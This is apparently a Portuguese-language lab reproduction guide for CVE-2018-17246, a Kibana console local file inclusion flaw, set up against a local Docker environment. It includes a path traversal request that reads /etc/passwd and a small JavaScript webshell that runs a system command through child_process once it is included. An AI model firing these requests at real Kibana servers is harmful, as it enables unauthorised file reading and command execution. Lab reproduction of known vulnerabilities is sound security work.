# Kibana Local File Inclusion (CVE-2018-17246)

Kibana é um painel de visualização de dados de código aberto para o Elasticsearch.

As versões do Kibana anteriores a 6.4.3 e 5.6.13 contêm uma falha de inclusão de arquivo arbitrária no plug-in do console. Um invasor com acesso à API do console do Kibana pode enviar uma solicitação que tentará executar o código javascript. Isso pode levar um invasor a executar comandos arbitrários com permissões do processo Kibana no sistema host.

Referências:

- https://nvd.nist.gov/vuln/detail/CVE-2018-17246
- https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/

## Configurar

Inicie o Kibana 5.6.12 e o Elasticsearch 5.6.16:

```
docker-compose up -d
```

Após iniciar o ambiente, o Kibana está escutando em `http://your-ip:5106`.

## Reprodução de vulnerabilidade

Envie a seguinte solicitação para acionar um path traversal básico:

```
http://your-ip:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
```

Embora não haja nenhuma resposta, exceto uma mensagem de erro com o código de status 500, você pode ver a exceção nos `logs de composição do docker`:

![](1.png)

O arquivo `/etc/passwd` foi importado com sucesso.

Para explorar essa vulnerabilidade, você precisa carregar um webshell JavaScript na máquina em que o Kibana está sendo executado e incluí-lo.

```js
// docker-compose exec kibana bash && echo '...code...' > /tmp/vulhub.js
export default {
  asJson: function () {
    return require("child_process").execSync("id").toString();
  },
};
```

![](2.png)
